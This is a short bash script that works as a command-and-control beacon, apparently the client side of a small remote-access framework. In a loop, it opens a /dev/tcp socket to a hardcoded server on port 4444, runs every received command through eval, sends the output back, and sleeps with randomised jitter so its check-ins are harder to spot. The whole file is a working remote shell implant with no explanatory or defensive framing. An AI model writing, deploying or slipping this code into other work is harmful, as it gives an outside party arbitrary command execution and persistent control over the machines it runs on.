#!/bin/bash

# Parameters
SERVER_IP="192.168.108.15"
SERVER_PORT=4444
DELAY=10
JITTER=2

# Beacon to communicate with Agent Server
while true; do
        # Open socket
        echo "[$(date)] Checking in..."
        exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
        while IFS= read -r -t 1 command <&5; do
                echo "Received command: $command"
                output=$(eval "$command" 2>&1 &)
                wait
                echo "$output" >&5
                echo "ac2delim" >&5
        done

        # Close socket
        exec 5>&-; exec 5<&-

        # Sleep for DELAY +- JITTER
        lower=$(( $DELAY - $JITTER ))
        upper=$(( $DELAY + $JITTER ))
        sleep_time=$(( RANDOM % ($upper - $lower + 1) + $lower ))
        sleep $sleep_time
done